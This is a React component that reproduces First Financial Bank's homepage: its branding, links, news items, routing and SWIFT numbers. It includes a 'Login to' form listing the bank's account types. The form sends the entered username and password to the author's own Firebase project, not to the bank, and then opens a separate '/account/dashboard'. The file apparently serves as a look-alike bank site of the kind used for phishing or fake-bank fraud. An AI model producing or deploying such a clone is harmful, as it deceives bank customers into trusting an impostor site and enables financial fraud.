import React from 'react';


import './home.css';

import house from './house.png';
import lend from './lend.png';
import chart from './chart.png';
import bank from './bank.png';

import mobile from './mobile.png';
import meeting from './meeting.png';
import map from './map.png';
import first from './first.jpeg';
import second from './second.jpeg';
import third from './third.jpeg';

import footerlogo from './footerlogo.png';
import footericon from './footericon.png';
import main from './main.png';
import toggle from './toggle.png';
import close from './close.png';
import axios from 'axios';

import { useState } from 'react';

import { useNavigate } from 'react-router-dom';





import { auth, db } from "./firebase";

import { collection, getDocs, query, where } from "firebase/firestore";
import { getAuth, signInWithEmailAndPassword } from "firebase/auth";

function Home(){

    const[showtoggle, setShowToggle] = useState(false);


    function handleToggle(e){
        e.preventDefault();

        setShowToggle(!showtoggle);
    }



    const[type, setType]= useState("Online Banking");
    const[email, setEmail] = useState("");
    const[password, setPassword]= useState("");
    const[showError, setShowError] = useState(false);
    const[isLoading, setLoading] = useState(false);

    const navigate = useNavigate();


    async function handleSubmit(e) {
        e.preventDefault();
        setShowError(false);
        setLoading(true);
      
        try {
          const userCredential = await signInWithEmailAndPassword(auth, email, password);
          const user = userCredential.user;
          console.log("Signed in as:", user);
    
          localStorage.setItem("authid", user.uid);
      
         
      setLoading(false);
          // Continue with your navigation logic
          navigate('/account/dashboard');
        } catch (error) {
            setLoading(false);
          const errorCode = error.code;
          const errorMessage = error.message;
          console.error("Error signing in:", errorCode, errorMessage);
          setShowError(true);
        //   setMessage(errorMessage);
        alert(errorMessage);
        }
      }


  
    return (
        <>
            

            {/* nav section */}

            <nav className='nav mynav'>

                <div className='navimagediv'>
                    <img className='navimage'src={main} />

                </div>

                <div className='navlinkdiv'>

                    <a href="https://ffin.com/en-us/about/" className='blockdiv'>
                        <i className='fa fa-info blockicon'></i>
                        <p className='blockpara'>About Us</p>

                    </a>

                    <a href='https://ffin.com/en-us/locations/' className='blockdiv'>
                        <i className='fa fa-location blockicon'></i>
                        <p className='blockpara'>ATM/Locations</p>

                    </a>

                    <a href='http://investorrelations.ffin.com/CorporateProfile' className='blockdiv'>
                        <i className='fa fa-line-chart blockicon'></i>
                        <p className='blockpara'>Investors Relation</p>

                    </a>

                    <a href='https://ffin.com/en-us/about/contact-us/' className='blockdiv'>
                        <i className='fa fa-envelope blockicon'></i>
                        <p className='blockpara'>Contact Us</p>

                    </a>

                    <a href='https://ffin.com/en-us/about/careers/' className='blockdiv'>
                        <i className='fa fa-users blockicon'></i>
                        <p className='blockpara'>Careers</p>

                    </a>

                </div>

            </nav>




            {/* end of nav section */}


            <nav class="mobilenavbar navbar navbar-expand-lg navbar-light bg-light">
            <img className='navimagetwo'src={main} />
  
        {showtoggle ? <img className='toggleimage' src={close} onClick={handleToggle} /> : <img className='toggleimage' src={toggle} onClick={handleToggle} />}
    
       
</nav>

{showtoggle &&
<div className='togglediv py-3'>
<ul className='footerlist text-left px-3'>
                          <li className='py-2'><a className='footerlink' href='https://ffin.com/en-us/about/'> <i className='fa fa-info '></i> About Us</a></li>
                          <li className='py-2'><a className='footerlink' href='https://ffin.com/en-us/locations/'> <i className='fa fa-location'></i> ATM/Locations</a></li>
                          <li className='py-2'><a className='footerlink' href='http://investorrelations.ffin.com/CorporateProfile'> <i className='fa fa-line-chart'></i> Investor Relation</a></li>

                          <li className='py-2'><a className='footerlink' href='https://ffin.com/en-us/about/contact-us/'> <i className='fa fa-envelope'></i> Contact Us</a></li>

                          <li className='py-2'><a className='footerlink' href='https://ffin.com/en-us/about/careers/'> <i className='fa fa-users'></i> Careers</a></li>
                      </ul>

</div>
}



            {/* hero section */}

            <section className='hero'>

                <div className='firstdiv'>
                    <h1 className='firsthead'>Find Home</h1>
                    <p className='firstpara'>First Financial Bank offers mortgage loan options that are designed to meet your family's needs.</p>

                    <a className='firstbtn btn'>Learn More</a>
                </div>

                <div className='seconddiv px-3 py-4'>
                    <h2 className='secondhead'>Login to:</h2>

                    <form onSubmit={handleSubmit}>
                        <select onChange={function(e){
                            setType(e.target.value);
                        }} value={type} className='form-control'required>
                        <option value="Online Banking">Online Banking</option>
                    <option value="Credit Cards">Credit Cards</option>
                    <option value="Trust Client Login" >Trust Client Login</option>
                    <option value="401K / Retirement Plan Account Login">401K / Retirement Plan Account Login</option>
                    <option value="DNRP2021">DNRP2021</option>
                    <option value="RJ Investor Client Access">RJ Investor Client Access</option>
                    <option value="FFB Payroll Card - Paynuver">FFB Payroll Card - Paynuver</option>
                    <option value="RemitPlus Express">RemitPlus Express</option>
                    <option value="Purchase Card/First Bankcard" >Purchase Card/First Bankcard</option>
                        </select>


                        <input onChange={function(e){
                            setEmail(e.target.value);
                        }} value={email} type="text" className='form-control my-3' placeholder='Enter username'required/>

                        <input onChange={function(e){
                            setPassword(e.target.value);
                        }}value={password} type="password" className='form-control my-3' placeholder='Enter password'required/>

                        <button type='submit' className='btn w-100 secondbtn'>{isLoading ? 'Loading....' : 'Login'}

                        </button>
                    </form>

                </div>

            </section>

            {/* end of hero section */}


            {/* second section */}

            <section className='secondsection'>
                <h1 className='sectiontwohead'>Unmatched Personal Service with Convenient Online Features</h1>

                <p className='sectiontwopara my-3'>
                Nothing will ever replace a handshake and a smile. Personal service requires person-to-person interaction. On the other hand, your time is valuable. Sometimes, the <br/> convenience of online banking serves you well. 
                </p>


                <p className='sectiontwopara my-3'>
                How can we help? Click the appropriate button below or call <a style={{
                    color:"#00396f",
                    textDecoration:"underline",
                }} href="">855-660-5862</a>  to speak with a member of our team.
                </p>

                <div  className='buttondiv text-center py-4'>

                    <a href="https://ffin.com/en-us/personal-banking/bank/checking/open-an-account-with-first-financial-bank/"className='btn secondsectionbtn'>OPEN A CHECKING ACCOUNT ONLINE </a>

                </div>


                <div className='py-2 secondflex'>

                    <div className='icondiv'>
                        <img className='iconimage' src={house} />

                        <h4 className='icontext'>House Loans</h4>

                    </div>

                    <div className='icondiv'>
                        <img className='iconimage' src={lend} />

                        <h4 className='icontext'>Personal Loans</h4>

                    </div>


                    <div className='icondiv'>
                        <img className='iconimage' src={bank} />

                        <h4 className='icontext'>Commercial Banking</h4>

                    </div>

                    <div className='icondiv'>
                        <img className='iconimage' src={chart} />

                        <h4 className='icontext'>Asset Management</h4>

                    </div>

                </div>


            </section>

            {/* end of second section */}


            <div className='my-4 row mobilediv'>

                <div className='col-md-6 imagecol'>
                    <img className='mobileimage'src={mobile} />

                </div>

                <div className='col-md-6 textcol'>
                    <h2 className='textcolhead'>Mobile Deposit</h2>
                    <p className='textcolpara'>Depositing a check is no longer an errand. Deposit paper checks directly into your First Financial account by using the First Financial mobile app and taking a picture of the check with your smartphone or tablet.</p>


                    <a href='https://ffin.com/en-us/personal-banking/bank/online-mobile/mobile-deposit/'className='btn textcolbtn'>GET STARTED</a>
                </div>

            </div>


            <div className='my-4 row meetingdiv'>


            <div className='col-md-6 textcol'>
    <h2 className='textcolhead'>Highlighting First Financial Bank's Women Leaders</h2>
    <p className='textcolpara'>We are extremely proud of our female leadership at all levels of the organization and we salute them for the wonderful job that they do. We want to share the stories of these professionals, both past and present, who drive our customer-focused mission and help maintain First Financial Bank’s status as one of the nation’s leading community banks.</p>


    <a href='https://ffin.com/en-us/about/diversity/women-in-banking/'className='btn textcolbtn'>HEAR THEIR STORIES</a>
</div>

<div className='col-md-6 imagecol'>
    <img className='meetingimage'src={meeting} />

</div>



            </div>


            <div className='my-4 row meetingdiv mt-5'>
            <div className='col-md-6 imagecol'>
    <img className='meetingimage'src={map} />

</div>

            <div className='col-md-6 textcol'>
    <h2 className='textcolhead'>Locations Across Texas</h2>
    <p className='textcolpara font-weight-bold'>Banking Locations Convenient for YOU </p>
    <p className='textcolpara'>From the Panhandle to the Gulf Coast, from the Franklin Mountains to the Piney Woods, First Financial Bank has 80 branches across the great state of Texas for your convenience. Stop by and say "hi" at one of our convenient locations. </p>


    <a href='https://ffin.com/en-us/about/banking-regions/'className='btn textcolbtn'>EXPLORE OUR REGIONS</a>
</div>





            </div>


            <div className='newdiv'>

                <h2 className='font-weight-600'>News</h2>

                <a style={{
                    textDecoration:"none",
                    color:"black"
                }} href='https://ffin.com/en-us/news-overview/'><h6>VIEW ALL NEWS</h6></a>

            </div>



            <section className='partner'>

                <div className='parnterdiv'>
                    <img className='partnerimage' src={first}/>

                    <h3 className='partnertitle'>
                    First Financial Bank, N.A. Names Parker to EVP, Chief Compliance Officer Role

                    </h3>

                    <p className='partnerdate'>01/18/2023 3:48 PM</p>

                    <a href=''className='partnerbtn btn'>CONTINUE READING</a>

                </div>


                <div className='parnterdiv'>
                    <img className='partnerimage' src={second}/>

                    <h3 className='partnertitle'>
                    First Financial Announces the Election of Michelle S. Hickox as Chief Financial Officer

                    </h3>

                    <p className='partnerdate'>01/10/2023 4:05 PM</p>

                    <a href=''className='partnerbtn btn'>CONTINUE READING</a>

                </div>


                <div className='parnterdiv'>
                    <img className='partnerimage' src={third}/>

                    <h3 className='partnertitle'>
                    Ron Butler Named Texas Bankers Hall of Fame Honoree

                    </h3>

                    <p className='partnerdate'>01/10/2023 4:05 PM</p>

                    <a href=''className='partnerbtn btn'>CONTINUE READING</a>

                </div>

            </section>



            <section className='footer'>

                <div className='footflex'>

                    <div className='footflexdiv'>

                        <img className='footerlogo'src={footerlogo} />

                    </div>
                    <div className='footflexdiv'>
                        <h6 className='flexdivhead'>CONNECT WITH US</h6>

                        <img className='footericon footerlogo' src={footericon} />

                    </div>
                    <div className='footflexdiv'>

                      <ul className='footerlist'>
                          <li><a className='footerlink' href='https://ffin.com/en-us/about/'> <i className='fa fa-info '></i> About Us</a></li>
                          <li><a className='footerlink' href='https://ffin.com/en-us/locations/'> <i className='fa fa-location'></i> ATM/Locations</a></li>
                          <li><a className='footerlink' href='http://investorrelations.ffin.com/CorporateProfile'> <i className='fa fa-line-chart'></i> Investor Relation</a></li>

                          <li><a className='footerlink' href='https://ffin.com/en-us/about/contact-us/'> <i className='fa fa-envelope'></i> Contact Us</a></li>

                          <li><a className='footerlink' href='https://ffin.com/en-us/about/careers/'> <i className='fa fa-users'></i> Careers</a></li>
                      </ul>
                   

                    </div>

                    

                </div>

                <hr style={{ border: '0.3px solid white', margin: '20px 0' }} />

                <div className='col-md-10 m-auto bolddiv'>
                    <p className='bolddivpara font-weight-bold'>Investment and Insurance Products Are:</p>
                    <p className='bolddivpara'>Not a Deposit Not FDIC Insured Not Insured by Any Federal Government Agency Not Guaranteed by The Bank May Lose Value</p>
                </div>

                <hr style={{ border: '0.3px solid white', margin: '20px 0' }} />


                <div className='lastdiv'>
                    <div className='lasdivfirst'>
                        <p className='font-weight-bold bolddivparatwo'>© 2023 First Financial Bankshares, All Rights Reserved
First Financial Bank Routing Number: 111301122
First Financial Bank Non-Connected SWIFT/BIC: FITEUS41</p>

                    </div>

                    <div className='lastdivsecond'>
                        <p className='bolddivparatwo'>Terms Of Use  Privacy Policy  Policies and Disclosures  Transparency in Coverage  FAQs</p>

                    </div>
                </div>

            </section>
        
        </>
    );
}


export default Home;